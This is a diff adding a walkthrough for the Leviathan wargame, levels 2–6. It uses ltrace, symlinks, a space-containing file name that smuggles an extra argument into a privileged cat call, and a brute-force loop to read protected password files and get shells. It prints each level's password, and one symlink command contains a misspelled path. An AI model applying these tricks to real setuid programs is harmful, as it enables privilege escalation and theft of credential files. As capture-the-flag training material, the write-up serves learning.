@@ -41,25 +41,119 @@ Using **sex** as a password on its own seems to let us run the script and spawn 
 
 ### Leviathan 2
 ###### There is no information for this level, intentionally.
-T.B.E
+
+Use the **ltrace** command to trace library calls of the **printfile** binary.
+
+If we read a file that we don't have **access()** to  
+```
+leviathan2@leviathan:/tmp/blabla$ ltrace ~/printfile /etc/leviathan_pass/leviathan3
+__libc_start_main(0x804852b, 2, 0xffffd734, 0x8048610 <unfinished ...>
+access("/etc/leviathan_pass/leviathan3", 4)                             = -1
+puts("You cant have that file..."You cant have that file...
+)                                      = 27
++++ exited (status 1) +++
+```
+
+If we read a file that we have **access()** to  
+```
+leviathan2@leviathan:/tmp/blabla$ ltrace ./printfile test
+__libc_start_main(0x804852b, 2, 0xffffd774, 0x8048610 <unfinished ...>
+access("test", 4) = 0
+snprintf("/bin/cat test", 511, "/bin/cat %s", "test") = 13
+geteuid() = 12002
+geteuid() = 12002
+setreuid(12002, 12002) = 0
+system("/bin/cat test"test
+ <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> ) = 0
++++ exited (status 0) +++
+
+```
+
+When we read a file, the binary first checks if we have **access()** to that file.  
+It reads the effective user id (geteuid()) to check the permissions of the file.  
+Then, it sets the real and effective user id to 12002, both for user and group.  
+Finally, it reads from the file **IF** the user leviathan2 have access to read from that file.  
+
+By playing around with the binary, I found out that if we have a file with spaces in its name we 
+can trick the binary to think that both parts of the file names are different files.
+
+We can create a symbolic link file that points to the password file.  
+**ln** -s /etc/leviathan_pass/leviathhan3 test
+
+Then, we can create a file that has a space in its name.  
+**touch** "test file"
+
+By using the binary with the files we created, we can output the password before the error triggers.  
+**~/printfile** test\ file (both test and test file should be in a tmp directory).
+
+>Ahdiemoo1j  
+>/bin/cat: file: No such file or directory
 ##
 
 ### Leviathan 3
 ###### There is no information for this level, intentionally.
-T.B.E
+**ltrace** ./level3 
+```
+__libc_start_main(0x8048618, 1, 0xffffd794, 0x80486d0 <unfinished ...>
+strcmp("h0no33", "kakaka") = -1
+printf("Enter the password> ")= 20
+fgets(Enter the password> test
+"test\n", 256, 0xf7fc55a0) = 0xffffd5a0
+strcmp("test\n", "snlprintf\n") = 1
+puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
+) = 19
++++ exited (status 0) +++
+```
+We see that the password we entered is compared with the string **snlprintf**.  
+
+**./level3** snlprintf  
+```
+leviathan3@leviathan:~$ ./level3 
+Enter the password> snlprintf
+[You've got shell]!
+$ cat /etc/leviathan_pass/leviathan4
+vuH0coox6m
+```
+
+> vuH0coox6m
 ##
 
 ### Leviathan 4
 ###### There is no information for this level, intentionally.
-T.B.E
+The **bin** binary inside ~./trash/ outputs 11 blocks of 8bits each.
+```
+01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 
+```
+
+By translating from Binary to ASCII text, we get the next level's password.  
+> Tith4cokei
 ##
 
 ### Leviathan 5
 ###### There is no information for this level, intentionally.
-T.B.E
+**./leviathan5** 
+> cat: /tmp/file.log: No such file or directory
+**ln** -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+**./leviathan5**
+> UgaoFee4li
 ##
 
 ### Leviathan 6
 ###### There is no information for this level, intentionally.
-T.B.E
+
+**./leviathan6**
+> usage: ./leviathan6 <4 digit code>  
+
+```for i in {0..9999}; do ~/leviathan6 $i; done;```  
+After some time, we get a shell as leviathan7.
+```
+$ whoami
+leviathan7
+$ cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+```
+
+> ahy7MaeBo9
 ##
